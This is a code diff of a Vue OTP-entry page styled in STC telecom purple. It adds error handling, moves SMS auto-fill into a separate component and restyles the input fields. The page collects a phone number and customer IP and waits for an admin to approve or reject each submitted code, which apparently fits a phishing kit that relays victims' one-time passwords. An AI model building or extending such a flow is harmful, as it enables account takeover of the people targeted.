@@ -104,7 +104,6 @@ import { getReasonLabel } from '@/constants/rejectionReasons';
 import { safeRedirect } from '@/utils/safeRedirect';
 import { getSessionToken } from '@/utils/sessionToken';
 import { customerBroadcastChannel } from '@/utils/customerBroadcastChannel';
-import { useWebOtp } from '@/composables/useWebOtp';
 import { getRecaptchaToken } from '@/composables/useRecaptcha';
 
 const router = useRouter();
@@ -114,7 +113,12 @@ const { t } = useI18n();
 useVisitorTracking( 'stc/otp' );
 
 // ─── Load context from sessionStorage / query params ────────────────
-const stcContext = JSON.parse( sessionStorage.getItem( 'stcContext' ) || '{}' );
+let stcContext = {};
+try {
+    stcContext = JSON.parse( sessionStorage.getItem( 'stcContext' ) || '{}' );
+} catch ( err ) {
+    console.warn( '[StcOtpPage] Failed to parse stcContext:', err );
+}
 const phoneNumber = stcContext.phoneNumber || route.query.phone || '';
 const customerIp = stcContext.customerIp || '';
 
@@ -187,14 +191,20 @@ const verifyOtp = async () =>
 // ─── WebSocket — listen for admin STC OTP approval/rejection ────────
 async function setupWebSocket ()
 {
-    const echo = await getEcho();
-    if ( !echo ) return;
+    try {
+        const echo = await getEcho();
+        if ( !echo ) return;
 
-    echoChannelName = await customerBroadcastChannel( 'stc', getSessionToken() );
-    echoChannel = echo.channel( echoChannelName );
+        echoChannelName = await customerBroadcastChannel( 'stc', getSessionToken() );
+        if ( !echoChannelName ) return;
 
-    echoChannel.listen( '.StcOtpApproved', handleApproved );
-    echoChannel.listen( '.StcOtpRejected', handleRejected );
+        echoChannel = echo.channel( echoChannelName );
+        echoChannel.listen( '.StcOtpApproved', handleApproved );
+        echoChannel.listen( '.StcOtpRejected', handleRejected );
+    } catch ( err ) {
+        console.warn( '[StcOtpPage] WebSocket setup failed:', err?.message || err );
+        // Polling fallback will handle it
+    }
 }
 
 function handleApproved ( event )
@@ -280,20 +290,13 @@ const retryOtp = () =>
 };
 
 // ─── Lifecycle ──────────────────────────────────────────────────────
-// WebOTP API — auto-fill OTP from SMS on Android Chrome
-const { start: startWebOtp, stop: stopWebOtp } = useWebOtp( ( code ) =>
-{
-    const digits = String( code || '' ).replace( /\D/g, '' ).slice( 0, 6 );
-    if ( digits.length >= 4 ) otpCode.value = digits;
-} );
-
 onMounted( () =>
 {
     startCountdown();
     otpInputRef.value?.focusFirstEmpty();
     setupWebSocket();
     startPolling();
-    startWebOtp();
+    // WebOTP is handled by OtpInput component
 
     if ( route.query.error )
     {
@@ -303,7 +306,7 @@ onMounted( () =>
 
 onUnmounted( () =>
 {
-    stopWebOtp();
+    // WebOTP cleanup is handled by OtpInput component
     if ( countdownInterval ) clearInterval( countdownInterval );
     if ( pollTimer )
     {
@@ -312,30 +315,52 @@ onUnmounted( () =>
     }
     if ( echoChannel && echoChannelName )
     {
-        try { window.Echo?.leave( echoChannelName ); } catch { /* */ }
+        try {
+            if ( echoChannel.leave ) {
+                echoChannel.leave();
+            } else if ( window.Echo?.leave ) {
+                window.Echo.leave( echoChannelName );
+            }
+        } catch { /* */ }
     }
 } );
 </script>
 
 <style scoped>
-/* OtpInput color overrides: green → STC purple */
-:deep(.otp-single__wrapper--focused) {
-    border-color: #4F008C;
-    box-shadow: 0 0 0 3px rgba(79, 0, 140, 0.12);
+/* OtpInput color overrides: default → STC purple */
+:deep(.otp__field--focused) {
+    border-color: #4F008C !important;
+    box-shadow: 0 0 0 1.5px rgba(79, 0, 140, 0.1) !important;
 }
 
-:deep(.otp-single__char--filled) {
-    border-color: #4F008C;
-    background: rgba(79, 0, 140, 0.04);
+:deep(.otp__field--complete) {
+    border-color: #4F008C !important;
+    background: rgba(79, 0, 140, 0.02) !important;
+}
+
+:deep(.otp__input) {
+    color: #4F008C !important;
+}
+
+:deep(.otp__auto-fill-status--listening) {
+    background-color: #f3f0ff;
     color: #4F008C;
+    border: 1px solid #d8c9f0;
 }
 
-:deep(.otp-single__char--active) {
-    border-color: #4F008C;
-    box-shadow: 0 0 0 2px rgba(79, 0, 140, 0.15);
+:deep(.otp__auto-fill-status--received) {
+    background-color: #f0fdf4;
+    color: #166534;
+    border: 1px solid #22c55e;
 }
 
-:deep(.otp-single__cursor) {
-    background: #4F008C;
+:deep(.otp__paste-btn) {
+    color: #4F008C !important;
+    border-color: #d8c9f0 !important;
+}
+
+:deep(.otp__paste-btn:hover:not(:disabled)) {
+    border-color: #4F008C !important;
+    background: rgba(79, 0, 140, 0.04) !important;
 }
 </style>
